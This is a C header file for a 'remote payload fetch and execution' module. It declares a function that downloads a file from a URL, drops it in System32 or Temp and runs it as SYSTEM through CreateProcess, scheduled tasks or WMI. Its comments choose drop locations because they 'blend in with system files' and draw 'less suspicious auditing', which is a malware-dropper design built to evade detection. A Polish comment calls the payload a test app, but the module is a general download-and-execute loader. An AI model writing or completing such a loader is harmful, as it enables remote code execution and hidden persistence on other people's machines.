/*
 * Remote payload fetch and execution module.
 *
 * Downloads a file from a URL using WinHTTP API (no .NET dependency),
 * saves it to a system location, and executes it with SYSTEM privileges.
 *
 * Two download backends:
 *   WinHTTP — lightweight, no browser dependencies, works in service context
 *   URLDownloadToFile — available via urlmon.dll, simpler API
 *
 * We prefer WinHTTP because it gives us more control (custom headers,
 * proxy handling, TLS 1.3 support on Win11).
 *
 * Execution methods:
 *   — Direct CreateProcess (if already admin/SYSTEM)
 *   — Scheduled task (runs as SYSTEM)
 *   — WMI (Win32_Process.Create) — runs as admin
 *
 * Drop locations:
 *   %WINDIR%\System32\ — blends in with system files
 *   %WINDIR%\Temp\ — writable by all users
 *   %TEMP% — user-writable, less suspicious auditing
 *
 * xyz.exe to osobna apka testowa (autor: user). Nasza rola kończy się
 * na pobraniu i uruchomieniu jako SYSTEM. xyz.exe sam sprawdza
 * swoje uprawnienia i wyświetla "Test passed" jeśli leci jako SYSTEM.
 */

#pragma once
#ifndef PAYLOAD_H
#define PAYLOAD_H

#include <windows.h>

/* Drop location options */
#define PAYLOAD_DROP_TEMP      0
#define PAYLOAD_DROP_SYSTEM32  1
#define PAYLOAD_DROP_SYSTEM    2

/* Download and execute a remote payload.
 * Returns 0 on success, nonzero on failure.
 *
 * Parameters:
 *   szUrl        — URL to download (HTTP or HTTPS)
 *   szFilename   — filename to save as (e.g., "xyz.exe")
 *   dwDropLoc    — PAYLOAD_DROP_* constant
 */
int payload_fetch_and_exec(const char *szUrl,
                           const char *szFilename,
                           DWORD dwDropLoc);

#endif
